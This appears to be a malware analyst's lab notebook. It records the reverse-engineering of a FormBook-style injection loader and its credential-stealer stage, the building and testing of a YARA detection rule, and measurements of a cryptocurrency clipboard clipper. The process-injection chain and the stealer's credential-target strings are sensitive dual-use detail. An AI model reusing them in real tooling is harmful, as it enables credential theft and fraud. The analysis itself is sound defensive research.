3. **Two fabricated `CONTEXT` fields, both ours.** `Esp` echoed the loader's own
   stack, so the injected thread flattened it. `Eip` was written
   `NTDLL_BASE + 0x9FF0` instead of `+ 0x79FF0` — and because the loader patches
   that value into the trampoline as the resume address, a *completed* payload
   `ret`ed into a data table and presented as a crash in ntdll.

**The decryption is the loader's work, not the stub's.** It rewrites ~98.8% of
the region and only then signals. An earlier reading here credited the stub, from
a comparison against a dump belonging to a different run lineage.

#### The chain, end to end

    wait for a child of explorer.exe
    -> NtCreateSection, RWX, size a random draw between 2 MB and 131 MB
    -> fill the whole thing with keystream (camouflage; 1.1% of it is content)
    -> copy 273,408 encrypted bytes in at an offset inside the fill
    -> map into the target, redirect a thread through a hijack trampoline
       (push the resume address, pushal, call, popal, ret -- it borrows a
       thread and gives it back, leaving no new-thread artifact)
    -> stub waits on a shared byte; loader decrypts in place; loader writes 0x1d
    -> stub runs stage 4, completes, and returns

Three checkpoints are on the drive — `after_inject.state`,
`after_handshake.state`, `after_decrypt.state` — each saving roughly twenty
minutes of re-running.

#### Stage 4 is a credential stealer, and the chain has IOCs at last

FLOSS in shellcode mode (`-f sc32`) over the decrypted stage. Static strings are
still worthless — 833 ASCII runs, all random — but **this family builds its
strings on the stack at runtime**, so the stack, tight and decoded passes
recover real ones.

Browser credential harvesting, from the stack strings:

    Internet Explorer\IntelliForms\Storage2   IE saved-password store
    Local State                               Chrome's encryption key file
    Chrome   Firefox   \Firefox   Firefox\
    Cookies  Autofill
    windir   ProgramFiles   Program Files   SysWOW64\
    \explorer.exe
    no-cache   200OK

Network, from the tight strings:

    gzip, deflate, br
    Nokia5130c-2/2.0 (07.97) Profile/MIDP-2.1 Configuration/CLDC-1.1
    http://www.sqlite.org/2014/sqlite-dll-win32-x86-3080300.zip

The user agent impersonates a **Nokia feature phone** — a documented FormBook
trait and a strong YARA anchor. The SQLite URL is the stealer fetching a DLL to
parse Chrome's and Firefox's credential databases, which are SQLite files. And
`\explorer.exe` in its own strings independently corroborates the injection
target found empirically through the poll loop.

**These are the first IOCs this chain has ever produced.** This file records that
the payload *"has no plaintext indicators at all … which is why YARA matched
nothing across nine images and the ruleset is not at fault"*. That still stands,
and is now explained rather than merely observed: the indicators are built at
runtime, and the code that builds them only runs after a two-party handshake
inside an injected thread. **No detonation could have reached them** — nine
didn't, and a tenth would not have either.

The MalwareBazaar label was *"Formbook, unverified — no artifact from any run
names a family."* The Nokia user agent and the stealer target set are the first
evidence that supports it.

#### What is open

**Stage 4's runtime behaviour**, as opposed to its capability. In this
environment it runs to completion and returns without dropping a file, opening a
socket or touching the registry — consistent with one exchange of a protocol
that may have several, since `handshake_probe.py` interleaves exactly once.
`--survey` showed it zeroing two 64 KB regions on the way out, so it cleans up
after itself.

#### CLOSED — the YARA rule is written, and it is not made of the IOCs — 16 Aug

`tools\yara\local\ringforge_formbook_stage4.yar`,
`RingForge_FormBook_422e30ed_ContextCookie`.

**It does not identify a stage, and this section first said it did.** The rule
shipped as `..._Stage4_ContextCookie` and was described here as a stage 4
detector. Aligned on the seed, `stage4_mapped_b454edc7` and
`stage3_alloc_at540M_dc038cc7` — stage 3's own allocation, decrypted in place at
540M blocks — are **97.5% byte-identical**, 266,597 of 273,408 bytes, and all
four anchors fall inside shared runs (the seed in 16,444 bytes, the rest in
87,806). Stage 3 and stage 4 are one framework body carrying different data.

That reframes the validation below rather than undoing it. Run `bb51babb`
crashed in stage 3 like the other eight, so **the six RegSvcs matches are stage
3**, not stage 4 — the rule fired in a process stage 4 was never reached in. As
a detector for the chain that is correct and useful; as a claim about which
stage is resident it would have answered the project's central open question
wrongly while looking like evidence. Renamed, and the meta carries
`caveat = "a match does not establish that stage 4 was reached"`.

**And there is no stage-4 anchor to be had from these two artifacts — settled
16 Aug.** This section first said the next question was whether any of the 6,811
differing bytes are stable code. They are not code at all: they are **stage 4's
undecrypted remainder**.

34 differing runs. The tell is an entropy asymmetry across `0x11e0b`–`0x1215a`,
where stage 4 measures **7.42 and 7.47** against stage 3's **5.59 and 5.72** —
the packed side is the *stage 4* side. Disassembling the same offsets confirms
it: at `0x11f89` stage 3 is ordinary code —

    mov  [ebp-0x340], eax   /  mov [ebp-0x344], ebx  /  cmp eax, edi
    je   0x121ab            /  call 0xbc20           /  mov ecx, 2
    sub  ecx, [esi+0x6d8]   /  add eax, ecx

cookie and all — while stage 4 at the same place decodes as `pop di`, `outsd`,
`lcall`, `iretd`. Noise. The rest of the differing bytes are the first 4 KB,
high entropy on both sides, which is the context/header region.

**No relocation deltas either** — checked for a repeated constant across the
short diffs and there is none, so none of this is a base-address artifact.

This matches what the artifact README already said and nobody connected:
*"plaintext code pages surrounded by data that stays packed"*, and the loader
rewriting ~98.8% of the region before it signals. The 2.5% that differs is
mostly the 1.2% it never rewrote.

**Consequence: a stage-4-specific signature and the runtime IOC strings are the
same problem.** Both need stage 4 decrypted further than any capture has it, and
that means stage 4 running its own decoders. Keying a rule on the ciphertext
would key it on this build's keystream — a hash wearing a signature's clothes.
`RingForge_FormBook_422e30ed_ContextCookie` staying stage-agnostic is not a
temporary compromise; it is the honest ceiling until the payload runs further.

#### And running it further does not reach them — 16 Aug

**The decoders are never called in this environment.** Stage 4 runs to
completion here, and the strings are not built at any point during it.

`scan_stage4_memory.py --watch` sweeps the stack and the two 64 KB regions the
payload wipes, from a block hook, every 50,000 blocks — **322 checkpoints across
the whole run**. Nothing, in ascii or wide, for the user agent, the SQLite URL,
`IntelliForms`, `Local State`, `Autofill` or the `Accept-Encoding` line.

That completes the picture: the strings are absent from the file (30 candidates,
not even as `mov` immediate chunks), from all sixteen minidumps, from emulated
memory *during* the run, and from it *after*.

**The reason is in the survey: 23 of stage 4's 67 pages ever execute.** Two
thirds of the payload never runs. The credential-harvesting code sits in that
two thirds, which is what an environment with no browsers, no credential stores
and no C2 should produce. FLOSS did not find those strings by running the
payload either — its stack, tight and decoded passes emulate decoder functions
*in isolation*, which is precisely how they reach code a natural run walks past.

So the IOCs are already as recovered as running can make them, and further
emulation of the whole payload adds nothing. What the run does confirm:

- **The zeroing is real and precise** — `0x3ee0000` and `0x3ef0000` each take
  exactly **16,384 writes**, one dword per 4 bytes across 64 KB. A wipe.
- Only **249 of 273,408** payload bytes change across the entire run.
- **9.58M writes land on the stack** at `0x10070000`; the payload's own image is
  barely touched.

**A methodological trap, and it produced a clean-looking false negative first.**
`--watch` originally ran in chunks, calling `resume()` repeatedly. The run length
tracked the chunk size — **4,404,334 blocks at 250K chunks, 16,096,220 at 2M
chunks, against 16,096,220 unchunked** — so every sweep sampled a truncated run
and "nothing sighted" meant nothing at all. It now sweeps from a `UC_HOOK_BLOCK`
callback without restarting `emu_start`, and reaching the same block count as an
uninterrupted run is the check that it is faithful. **Compare the block count
against an unchunked run before believing any watched result.**

**The premise recorded here is retracted.** This section read: *"The Nokia user
agent and the SQLite URL are stack-built, so a rule over a file will not see
them — it needs to match a memory image, which `memory_yara` already scans."*
The first half is right and the second does not follow. A memory image does not
contain them either:

- 30 candidate strings, ascii and wide, against the decrypted stage — **zero**.
  Not even as the 4-byte `mov [ebp-X], imm32` chunks a stack string leaves
  behind, so they are not stack literals in this image at all; they come out of
  decoders FLOSS reaches by emulating functions one at a time.
- Against all sixteen minidumps on hand, **including the six `RegSvcs.exe`
  images in which this framework was resident** — zero.
- Emulated from `after_handshake.state` through 42,072,701 blocks of stage 4,
  then every mapped region swept — zero. The only hits anywhere were `windir`,
  `ProgramFiles`, `Program Files` and `SysWOW64` inside ntdll's and kernel32's
  own images: Windows' strings, present in every process, and a false positive
  in any rule that lists them.

So the IOCs stay documentation. **The rule keys on the context cookie instead** —
`mov dword ptr [esi+0x6d8], 0x32dfd514`, then the decode/encode/check shapes
that use it. Compiled in, so it is present wherever the stage is mapped and
decrypted, whether or not the stealer ever ran.

Measured with the yara engine, not by substring search:

| target | result |
|---|---|
| `RegSvcs.exe` dumps, run `bb51babb` | **6/6 match** — scheduled, exit, and two WER crash dumps. That run crashed in stage 3, so these are stage 3 matches |
| decrypted framework artifacts | 2/2 match (`stage4_mapped`, `stage3_alloc540M`) — reading both is the point, not a miss |
| other dumps from the same run | 0/10 — launcher at t1 and t25, conhost ×3, powershell ×4, one unrelated |
| encrypted twin and packed stage 3 | 0/2 — it reads decrypted, not stored |
| `System32` + `SysWOW64` | 0/7,014 PE files |

All four strings fired in every positive. The launcher dumps being clean is
correct rather than a miss — the payload is section-mapped into `RegSvcs.exe`
and was never in the launcher's address space.

**And the bare offset is not usable, so do not read the family-marker note as
saying otherwise.** `[esi+0x6d8]` alone appears in 168 of those 7,014 files and
3–14 times in every minidump measured, benign ones included. It is good
corroboration for a human reading a disassembly and a guaranteed false positive
as a condition.

`scripts/scan_stage4_memory.py` is what produced the emulated-memory half. It
refuses to sweep when the run executed almost nothing — the first attempt
resumed `after_decrypt.state` bare, faulted at zero blocks because the
checkpoint holds the *loader's* EIP in ntdll, and reported a clean-looking "no
strings found" that was measuring the checkpoint rather than stage 4. Seed
`--eip 0x3e9f89b --esp 0x10080000` off `after_handshake.state`.

### Run `38f27025`, 16 Aug — every local rule fired, and none had ever been scanned

The first detonation since the rule existed. Contained (`level: ok`, one egress
via `Ethernet 2`, zero internet-facing), offsets `1, 25, 55`, re-dump `1`s, max
processes `24`, `dynamic_registry_reads.pmc` confirmed. 375 seconds, 6 processes
observed, 11 of 12 dumps written, 729 MB.

#### The summary is reconstructed, because the file is gone

`dynamic_run_summary.json` and the HTML report were exported, then lost from the
host while the case directory was being replaced — and the guest's copy went
with the revert that preceded the baseline rebuild. What follows was read out of
the summary before it disappeared. **`memory_yara_rescan.json` survives and is
the authority for the scan; everything else here is transcription.** Treat any
figure below as reported rather than re-checkable.

| | |
|---|---|
| run id | `38f27025-cf25-4d0d-8a8d-552b661a9dc4`, profile `standard` |
| verdict | score **70**, severity **High**, *Elevated Attention* |
| window | 375s against a 180s timeout, not timed out, exit 0 |
| isolation | `ok` — one egress, `192.168.56.20` → `192.168.56.1` via `Ethernet 2`, `reaches: contained` |
| memory | 6 processes observed, 12 attempted, 11 written, 9 skipped, 729 MB, `missed_descendants: 0` |

Process tree, which is the shape to compare future runs against:

    422e30ed....exe        1292   (parent 4568)
      powershell.exe       9732
      RegSvcs.exe          2084   <- crashed, hollowing target
        RegSvcs.exe        9044   <- child of the first RegSvcs
      WerFault.exe         9992

- **`WerFault` 9992 could not be dumped** at the +55s scheduled offset: ProcDump
  reported *"No process matching the specified PID"* — it had already gone.
- **Three skips, all explained**: the launcher exited with +55s still pending;
  `powershell` 9732's parent exited before it could be imaged at the spawn of
  11064; and `conhost` 11064 itself.
- **Module integrity**: 425 compared — 423 identical, 2 patched, 0 replaced,
  7 header mismatches. `regsvcs.exe` differed in **25,192 of 25,420 bytes
  (99.1%)** of `.text`.
- **ntdll unhooking**: 33,237 file opens in the stream, 11 system-DLL opens by
  the sample, 3 of them `ntdll`, 2 inside the hollowing target; 507 analyzer
  opens and 30 Windows-response opens excluded. Collected, not scored.
- **ATT&CK v15**: `T1562.001` *Impair Defenses: Disable or Modify Tools*, from a
  PowerShell Defender modification, and `T1059.001`. Two techniques, two tactics.
- **Crash**: `chain_crashed`, one event crash, `WerFault` 9992 witnessing pid
  2084 at 2:16:47.98 PM.

#### The scan was void, and the run was not

The run reported `dumps_scanned: 12, total_matches: 0` against
`rule_file_count: 1542`. Nothing about the detonation was wrong — `RegSvcs.exe`
pid 2084 was dumped **six times**, the WER image-timestamp check hit
(`recorded 0x5ff2b99b` against `on disk 0x68531ee1`), module integrity put
`regsvcs.exe` at 99.1% differing bytes in `.text`. **Only the ruleset was
wrong**, and the same 1542-with-zero was reported by run `bb51babb` on 13 Aug.

**No run this project has ever done has scanned one of its own rules.**
`tools\yara\rules\` holds only the two downloaded rulesets; hand-written rules
live in `tools\yara\local\` and reach the scan solely via
`bootstrap_yara_rules.ps1` copying them to `tools\yara\rules\local\`. That
directory has never existed on the guest. It is why
`ringforge_split_api_loader.yar` still carried *"this has not yet been scanned
against a real memory dump"* after seven runs of the sample it was written for.

`scripts/rescan_memory_yara.py` re-runs the pass over a finished run's dumps
without detonating, and refuses a bare zero: it reports which rule files are
local, `--expect <rule>` exits 3 when a named rule never compiled, and any
unreadable dump is VOID with exit 4 rather than a non-match. Both of the latter
guards exist because testing the script reproduced the failure it was written to
prevent — the dump records carry the guest's paths, so against a case directory
copied to the host all eleven scans failed `file not found` while the counts
still read `dumps_scanned: 11`.

#### The rescan, with the local rules installed — 1544 files

| dump | rule |
|---|---|
| `RegSvcs.exe` 2084 at t34, t55, t64, t64_redump; 9044 at t55, t64 | **`RingForge_FormBook_422e30ed_ContextCookie`** — 6/6, memory-only |
| launcher 1292 at t34_atspawn | **`RingForge_Loader_422e30ed_Stage2`** — memory-only |
| launcher 1292 at t1, t25, t34_atspawn; `powershell.exe` 9732 at t34 | **`RingForge_Split_API_Injection_Loader`** — memory-only |
| `WerFault.exe` 9992 at t64 | *nothing* |
| the sample on disk, 1,029,120 bytes | *nothing* |

`disk_rules: 0, memory_rules: 3, memory_only_rules: 3, total_matches: 11`.
**All three are memory-only** — the packed launcher carries none of them at
rest. The exported `dynamic_run_summary.json` still records zero, so the rescan
JSON is the result and the run summary is not.

**The first rescan understated that, and the cause is worth keeping.** It
reported `memory_only_rules: 2`, dropping Split_API. The run summary's key is
`sample_path`; `rescan_memory_yara.py` read `path`/`image`, got `""`, and fell
through to the first dump record — so the memory-vs-disk delta was computed
**dump against dump**, and every rule matching the launcher's own image was
subtracted as though it had been found on disk. Fixed, and guarded three ways: a
sample path resolving to one of the dumps is rejected, a missing sample exits 5
rather than computing a delta with nothing to subtract, and `--sample` supplies
one when the summary names a file that no longer exists. Note the direction —
with no sample at all, *every* memory match reports as memory-only, which
overstates the scored finding.

**`RingForge_Loader_422e30ed_Stage2` had never fired.** Written 07 Aug against
the 892 KB SmartAssembly assembly, and only the parent-at-spawn trigger reaches
that image — `t34_atspawn` is the dump that carries it. Both open notes about
these rules being unvalidated against real dumps are now closed by one rescan.

#### It is stage 3, and the crash is not behind us

`abnormal_termination` reports `chain_crashed: true`, pid 2084 crashed, WerFault
9992 witnessing. So this run died in stage 3 like the nine before it, and the
six `RegSvcs` matches are **stage 3** — the rule's own
`caveat = "a match does not establish that stage 4 was reached"`. Six hits is
confirmation the pipeline sees the chain end to end. It is not progress on the
crash.

**Two `RegSvcs` both carry the framework**: 9044 is a child of 2084 and matched
at t55 and t64. This file has long said the second `RegSvcs` is the one most
likely to hold the payload; both hold it.

**`WerFault` matched nothing**, across all 1,544 rules. On the AgentTesla chain
WerFault matched, because it reads the crashing process's memory and the payload
was visible inside it. Not here — so it is not a spare route to this image, and
a run that loses `RegSvcs` cannot be rescued by the WerFault dump the way that
one was.

`vm_check_and_bail` returned `no_vm_check` again, with registry reads captured —
a third data point for gap 4 being context-only by decision.

#### Confirmed independently on run `3f70058b`, 10 Aug

Rescanned before its dumps were deleted with the baseline's `cases\`. Ten dumps,
none failed, `disk_rules: 0`, **`memory_only_rules: 3`** — the same three, on a
run six days earlier with different pids.

| dump | rule |
|---|---|
| `RegSvcs.exe` 12080 at t58 | `RingForge_FormBook_422e30ed_ContextCookie` |
| launcher 12164 at t25 and t31_atspawn | `RingForge_Loader_422e30ed_Stage2` + `Split_API` |
| `powershell.exe` 6752 ×4 | `RingForge_Split_API_Injection_Loader` |
| `conhost.exe` 1004 ×3 | *nothing* |

**Six clean `conhost` images across the two runs** is the answer to the false
positive `ringforge_split_api_loader.yar` was written fearing — `"Open "` and
`"Close "` as ordinary UTF-16 UI text in a large GUI process dump. It does not
happen, and the mandatory-fragment condition is why.

**The dump coverage between the two runs is the clearest evidence the spawn and
exit triggers work.** `3f70058b` got **one** `RegSvcs` image; `38f27025` got
**six**. Same sample, same crash, six days of trigger work between them.

`scripts/rescan_memory_yara.py` is what made this cheap: both results came from
dumps that already existed, with no detonation and no revert.

### The baseline had been restoring a dirty one — rebuilt 16 Aug

Replacing `tooling-baseline` to install the local rules turned up three things
the old one had been restoring on **every revert since roughly 10 Aug**:

- **`cases\`, 1.33 GB across 74 files** — run `3f70058b`'s output, including 11
  `.dmp` totalling 1,154 MB. `case_metadata.json` and `combined_score.json` sat
  at the case root, which a new run for the same sample writes into.
- **`C:\werdumps\RegSvcs.exe.12080.dmp`**, 12.6 MB, 10 Aug. That directory is
  where `crash_evidence.py` looks at the start of a run, so every run began with
  an August crash dump in scope. Checked: `38f27025` attributed its timestamp
  mismatch to pid 2084 correctly, so nothing was contaminated — but that is one
  run coming out right, not a property of the setup.
- **The FormBook sample in `samples\`**, since 5 Aug. **Kept, deliberately**, on
  the same reasoning as `mimikatz.upx.exe`: this chain is the main line and
  re-acquiring means the MalwareBazaar AES zip and 7-Zip every time. It is
  recorded here because today it read as an accident — the previous session left
  no note, and this file said the baseline carried only the mimikatz samples.

`cases\` was exported first — everything but the dumps, 64 files and 116 MB, to
`Downloads\ringforge\outputs\export_3f70058b`. Run `3f70058b` exists nowhere
else: it is the run that confirmed the injected image is stage 3 byte for byte
and produced the first WER timestamp mismatch.

> **Now in `docs/WORKFLOW.md` — 20 Aug.** That doc still carried the riskier
> `-Delete` -> `-Take` order, which this section supersedes and which was never
> actually run against a real replacement. Reconciled, along with two things
> WORKFLOW never said: that a `git pull` on the guest does not survive a revert
> (it cost a verification run on 20 Aug), and how to tell a wedged
> `restoringsnapshot` from a slow one before touching it.

**Order used, and worth reusing:** take the new snapshot, restore it to verify,
*then* delete the old one and rename the new into place with
`VBoxManage snapshot <vm> edit <old> --name <new>`. WORKFLOW's
`-Delete` → `-Take` leaves no restore point between the two commands, on a
93.9 GB VM. The rename keeps `-Baseline` and the `-BaselineName` default working
untouched.

Boot to a logged-in session: **115s** from the rebuilt flat baseline, against
183s while both snapshots existed and 126–135s from the old one. The differencing
chain is visible at two deep, which is the cost this file records from the old
5-deep VM.

**A `-List` issued while a restore was still in flight reported "No snapshots".**
It was a transient misread and nothing was wrong, but it is the cheap version of
the wedge this file documents: VBoxManage returns when a state change is queued,
not done. The scripts wait for the state to settle; a manual call running
alongside one does not.

### Pick up here — 20 Aug

**Start here if you are cold. This supersedes the 17 Aug entry below**, which
stays because its subsections are the working record.

**Queues.** Build has **one**: the **EtherHiding JSON-RPC responder**, the new
gap below — and it is the kind that unlocks behaviour rather than fixing a
defect. **Queued as `0bw`, in two phases**: record the request before trying to
answer it, because a wrongly-encoded answer and a broken responder look
identical from outside. The two triage defects found alongside the carve are **both fixed**
(`1264b1c`, `4d30e43`). **Detonation empty**,
and `af2d8300…` has nothing left to give: its contract is dead on-chain, so a
re-run cannot get further than `c14cb5b6` did. 716 tests.
**WITHDRAWN 22 Aug — see *The IOCs*.** The dead address was
`0x0F14fc3b`, which is a *wallet*. The contract the implant queries is
`0x4E31128a` and has never been checked. A re-run got substantially further:
it delivered the request.

---

## THE C2 CONTROLS THE CLIPBOARD, AND THE LOOP RUNS ONCE A SECOND — 24 Aug

**Run `98e2f479`, with a served address deliberately different from the baited
one.** That single change made all three outcomes distinguishable and the answer
is unambiguous.

    bait wrote     0xC0FFEE0000000000000000000000000000C0FFEE
    served body    0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF
    clipboard got  0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF   644 times, no exceptions

    839 bait rounds: 644 substituted, 122 clean, 73 locked
    593 method=send beacons, one per second, every one carrying 0xC0FFEE...

**The clipper writes whatever the C2 returns.** Not the hardcoded table -- the
response body, verbatim, whether that is a wallet, an HTML page, or a string
nobody would mistake for an address. **An attacker controlling the C2 controls
what lands in the victim's clipboard**, with no validation anywhere in the path.

### The loop, timed

    t169    SecurityHealthHost spawns
    t197.9  eth_call -> answered with the sink hostname
    t198    first substitution        <- within one second of the C2 answer
    ...     once per second thereafter

Substitution is keyed to **the C2 fetch, not to spawn**: it begins the second the
answer arrives. Each cycle then does three things:

1. read the clipboard
2. `method=send&guid=&address=` -- report **what the victim copied**
3. write the C2's reply into the clipboard -- **the replacement**

The two channels carry different values simultaneously, which is the cleanest
statement of what this does: 593 beacons reported `0xC0FFEE…` while the
clipboard held `0xDEADBEEF…`.

### The lock is not a phase, it is jitter

    +3s     clean          +224s   substituting
    +195s   substituting   +596s   locked
    +215s   locked         +597s   substituting
                           +880s   locked

Seven transitions, locks lasting one to nine seconds. `bait5`'s 481-round lock
was one long instance of the same contention, not a distinct stage. The
three-phase model below over-fits a single run.

### And it restores a claim this file retracted

**"The clipper writes the C2's response body verbatim" was correct.** It was
retracted on 23 Aug because `bait6` produced the hardcoded wallet instead --
one observation, against a payload seven hours and forty-five minutes old,
taken as decisive against two consistent ones.

> That retraction was written directly beneath a paragraph warning against
> mistaking the longest observation available for the whole behaviour. The same
> error, in the opposite direction: **generalising from a single counter-example
> is no better than generalising from a single example.**

`bait6` remains **unexplained** and is now the anomaly rather than the rule. It
may be a fallback when the C2 answer is unusable, or something about a payload
left running for hours. It is one data point and is recorded as one.

### What is closed

- `getData()` -> bare hostname -> C2. **Closed.**
- Beacon protocol, both methods, and what selects between them. **Closed.**
- Substitution, with the real wallet, inside containment. **Closed** (23 Aug).
- The replacement's source: **the C2 response body. Closed.**
- The payload's lifetime: it does not exit. **Closed.**

Open: why `bait6` behaved differently, and the contract's transaction history.


## THE ATTACKER'S WALLET, IN OUR CLIPBOARD, 576 TIMES — 23 Aug

**Substitution is measured, with the real wallet, inside containment.** Run
`bait6`, 21:49, against the payload that spawned at 14:03:41 and was still
running -- **seven hours and forty-five minutes** after the watcher recorded it
as exited at t192.

    580 rounds, 576 substituted, 4 clipboard errors, 0 anything else

    wrote  0xC0FFEE0000000000000000000000000000C0FFEE
    read   0x0F14fc3bfAc3726172aCd08Fe4bFb79B633E76ff

Every one identical. That is `$eth` from the hardcoded table, in the EIP-55 form
the 22 Aug clipboard incident produced -- the same address, arrived at from
inside the guest rather than through the analyst's own clipboard. **The campaign
substitutes, it substitutes with the wallet in the table, and the wallet is
`0x0F14fc3b`.**

### This corrects two claims in the sections below

> **This retraction was itself wrong, 24 Aug.** Serving an address *different*
> from the baited one produced `0xDEADBEEF…` in the clipboard 644 times: the
> clipper does write the C2's response body verbatim. See *THE C2 CONTROLS THE
> CLIPBOARD*. `bait6` is the anomaly, not the rule, and retracting on one
> counter-example was the same error as generalising from one example. The text
> below stands as written.

**1. "The clipper writes the C2's response body verbatim." Not supported.**

That came from `bait5`, where the clipboard filled with FakeNet's default HTML
page and the served file contained exactly that. `bait6` disproves it: the
served file now holds the 42-byte tracer, so a verbatim-body clipper would paste
`0xC0FFEE…`. It pasted the hardcoded wallet instead, 576 times, with no HTML at
all.

    served file             clipboard received
    HTML page   (bait5)     the HTML page
    tracer      (bait6)     the hardcoded wallet

**No mechanism here explains both**, and that is left as a stated gap rather
than filled with a third theory -- the second one is what produced this
correction. What is solid: late-stage substitution uses the hardcoded table and
is matched to the format of what was copied.

It also retires the framing built on the wrong claim: **"an attacker controlling
the C2 controls what lands in every victim's clipboard" is not established.**
The clipboard got a wallet that was compiled into the sample, not one the C2
supplied.

**2. "The clipboard is taken and never released." Wrong.**

`bait5` recorded 481 consecutive failures and ended still locked, which was
written up as terminal. `bait6` opened the clipboard on its first round and got
576 clean reads out of 580. **The lock held at least 17 minutes and later
released**, so phase 3 is a state the clipper passes through, not an end state.

Both errors have the same shape: **the longest observation available was
mistaken for the whole behaviour.** That is the third time on this sample, after
the 240-second window and the 36-second "lifetime".

### What the sequence actually looks like now

    +8s      substitution begins, shortly after the payload spawns
    ~197s    substituting
    +205s    clipboard locked -- reads and writes both fail
    ...      at least 17 minutes locked
    +7h45m   substituting again, with the hardcoded wallet, uninterrupted

Whether phases 2 and 4 differ in *mechanism* or only in what happened to be
served is the open question, and it is answerable: serve the tracer from a clean
detonation and watch phase 2 with it already in place. That is the run that was
being set up when this one answered a bigger question by accident.


## THE CLIPPER HAS THREE PHASES, AND THE RUN ENDS INSIDE THE THIRD — 23 Aug

**A complete behavioural profile, from run `f3f6da3b` with a 900-second window
and the clipboard baited throughout.** Every earlier null result is explained by
it.

    14:03:41   SecurityHealthHost spawns             watcher t155
    14:03:49   substitution begins                   +8s
    14:03:58   loader powershell.exe exits           +17s   (the "root-exit" dump)
    14:07:06   clipboard LOCKED                      +205s
    14:21:05   still locked when the bait stopped    +1044s

> **"Never released" was wrong, corrected the same day.** The lock held for at
> least 17 minutes and had lifted by 21:49, when 576 of 580 rounds read cleanly.
> See *THE ATTACKER'S WALLET, IN OUR CLIPBOARD, 576 TIMES*. The longest
> observation available was again mistaken for the whole behaviour.

796 bait rounds: **129 clean, 186 substituted, 481 locked out.**

**Substitution starts within about eight seconds of the payload spawning**, runs
for roughly 197 seconds, and then the clipper takes the clipboard and keeps it.
Nothing released it in the following seventeen minutes. The loader exits *nine
seconds into* the substitution phase, which is why "the sample exited" was never
a statement about the sample.

(The 8s figure uses this bench's established ~26-second gap between
`started_at_utc` and the watcher's t0. `rpc5` was not exported, so the two clocks
were not cross-anchored on the `eth_call` this run; the phase *ordering* and the
wall-clock intervals are direct readings and do not depend on it.)

### Why every earlier bait run said nothing

- **The 240-second runs** tore down during or just after phase 1. The window
  ended before the clipper had done anything.
- **The phase-4 bait** was locked out from t212 -- it arrived in phase 3 and
  never saw phase 2. Its "no substitution" was a **114-round blind spot**, not
  an absence, and was written up as one at the time.
- **The 21:08 run** substituted from round 1 because the *previous* run's
  payload was still in phase 2 an hour later. That was contamination, and also
  the first evidence the payload outlives its run.

### Whichever expires first ends the run, so a long window needs both

`timeout_seconds` is the **ceiling**. `post_exit_observation_seconds` is how long
observation continues *after the root exits*, and it runs inside that ceiling
rather than past it. The run ends at whichever comes first.

On run `f3f6da3b` the timeout was 900 and post-exit 120: the root exited at t192,
post-exit ran out at t312, and the run ended there --
`duration_seconds: 496`, `ended_because: post_exit_observation_complete`. Raising
the timeout alone did nothing **because the timeout was not the binding
constraint that run**. Raising post-exit alone would fail the same way once it
exceeds the timeout, which the GUI warns about:

> Post-exit observation is longer than or equal to the sample observation
> timeout ... RingForge will stop at the timeout before the full post-exit
> observation window completes.

So for a window reaching t792 -- the whole substitution phase with margin --
**set post-exit to 600 and the timeout to 900.** Not one or the other.

> **Corrected 23 Aug.** This section first read "`timeout` is not the lever,
> `post_exit_observation_seconds` is", and suggested unticking installer mode as
> an alternative. Both wrong. The first generalised one run in which the timeout
> happened not to bind. The second is worse than the default: **non-installer
> mode ends the run the moment the root exits** (`orchestrator.py`, the
> `sample_exited` return), so it removes the post-exit window entirely. Installer
> mode is the only thing granting any observation past the loader's exit and
> must stay on.

### What this makes the sample

A clipper that is **useless to sandbox with default settings and works fine in
the wild**. Its whole active window opens after the loader has exited -- the
moment most pipelines call the run finished -- and its steady state is holding
the clipboard open, which no dynamic report has a field for.

> **The paragraph that stood here claimed the clipper writes the C2's response
> body verbatim, and that an attacker controlling the C2 therefore controls
> every victim's clipboard. Neither is supported.** Serving the tracer instead
> of the HTML page produced the *hardcoded* wallet in the clipboard, 576 times.
> See *THE ATTACKER'S WALLET, IN OUR CLIPBOARD, 576 TIMES*. The test proposed
> here was run and refuted the claim it was written to confirm, which is the
> best thing a proposed test can do.


## THE PAYLOAD DOES NOT EXIT AFTER 36 SECONDS. IT NEVER EXITED. — 23 Aug

**`SecurityHealthHost.exe` pid 6208 started at 13:26:00 and was still running at
13:30:45**, four and a half minutes later, holding the clipboard. Read out of the
guest's own process table while it ran:

    Id     Name                 StartTime            MB
    6208   SecurityHealthHost   8/23/2026 9:26:00 AM 77

The "36-second lifetime" recorded in the two sections below is **wrong**, and so
is everything derived from it.

### How the mistake was made, and the tooling was not at fault

Every run produced a dump named `SecurityHealthHost.exe_<pid>_t161_exit.dmp`,
trigger `process-exit`, roughly 36 seconds after spawn. That was read as the
process's lifetime.

**The trigger fires when the *root* exits, and dumps everything still alive
beneath it.** `SecurityHealthHost` is in that dump *because the watcher knew it
was alive*: `_dump_tree` only ever targets live processes, and `_pid_alive` has
always used psutil's process table, never ProcDump's output. The pipeline was
right. The name said "exit" next to a pid and I read it as a statement about
that pid.

> **This paragraph replaces a wrong one, 23 Aug.** The first version of this
> section blamed ProcDump's false `0x8007012B` -> "Target process no longer
> running", cited the existing entry saying that string had already cost three
> runs, and called for a fix so the watcher reads liveness from the process
> table. All of that was wrong: it already does. The real defect was a
> misleading label and a reader who did not check. Correcting a misreading with
> a second misreading, and filing a bug against working code, is worth leaving
> visible.

**So what is the 36 seconds?** It is the **loader** exiting 36 seconds after
injecting -- `t125 -> t161` in one run, `t158 -> t194` in the next. That is real,
consistent, and a property of the `.ps1`, not of the payload. It was attributed
to the wrong process.

**A dump filename is not a death certificate.** `_exit` on an image of a live
process is what four runs were read on.

### What this explains, all at once

- **The clipper is `SecurityHealthHost`**, alive the whole time. Nothing needed
  to outlive anything.
- **The 21:08 contamination**: the substituting clipper was the 19:57 run's
  `SecurityHealthHost`, still running an hour later. Not a mysterious survivor --
  a process nobody had checked was dead.
- **The absent persistence.** A clipper needs no autoruns, task or service if its
  process never exits. The "not a working clipper" puzzle was an artefact of
  believing it had a 36-second life.
- **The clipboard lock at +46s** is the payload taking the clipboard and keeping
  it, which is what a clipper does.

### What is now unsupported

- **"A fixed lifetime, not a reaction."** There is no measured lifetime at all.
- **The empty-body control.** It concluded the response does not change the
  timer. There is no timer. What it actually showed is that the response does not
  change *when the watcher is fooled*, which is nothing about the sample.
- **"Ten seconds to work with" after the beacon.** The window is not ten seconds
  and may not be bounded.

### The measurement that would have caught it

One command in the guest, while the run was live:

    Get-Process -Id <pid>

It was never run because a filename appeared to have answered it. The pipeline
had the truth the whole time and no reader asked it for the one fact that
mattered.

